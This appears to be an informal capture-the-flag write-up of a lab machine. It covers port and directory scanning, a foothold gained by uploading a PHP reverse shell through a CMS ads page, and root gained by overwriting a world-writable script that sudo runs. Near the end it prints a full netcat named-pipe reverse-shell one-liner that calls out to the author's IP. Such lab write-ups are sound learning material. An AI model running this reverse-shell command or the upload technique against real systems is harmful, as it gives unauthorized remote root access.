### Nmap
only one http port is open

### HTTP

found /content

and upon recursive scanning 

s                      [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 149ms]
inc                     [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 151ms]
as                      [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 147ms]
_themes                 [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 150ms]

### Shell

Obviously took help of the writeup here

Now after i logged in i knew there is a remote code execution vuln as per searchsploit


we can see that in the ads section we can write anythin so 

http://10.10.129.182/content/as/?type=ad

here i created an ad called hacked 

with ads code a php reverse shell(a.php)(copied and pasted the code)


after we submit it we can see that iwas has been uploaded


now we knew there was a path inc which listed all the contents of ads


http://10.10.129.182/content/inc/ads/

now i went there and i could see a hacked.php file with our reverse shell code in it.


so i started a netcat listener and clicked on hacked.php


and viola i got a shell


### Priv ESc

now after i get the system shell


i can see that i can run only one command using sudo

ww-data@THM-Chal:/etc$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

The content of the file is


www-data@THM-Chal:/home/itguy$ cat backup.pl
cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");



And in the etc path we can see that we have writable permission for this file


www-data@THM-Chal:/etc$ ls -al | grep copy
ls -al | grep copy
-rw-r--rwx   1 root root      80 Feb  5 16:25 copy.sh




i chnaged the content of the file to spwan a root reverse sheel to my locak system, the content i changed to is


www-data@THM-Chal:/etc$ cat copy.sh
cat copy.sh

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.20.174 9999 >/tmp/f


and viola i got a root shell after i started a netcat listener on port 9999



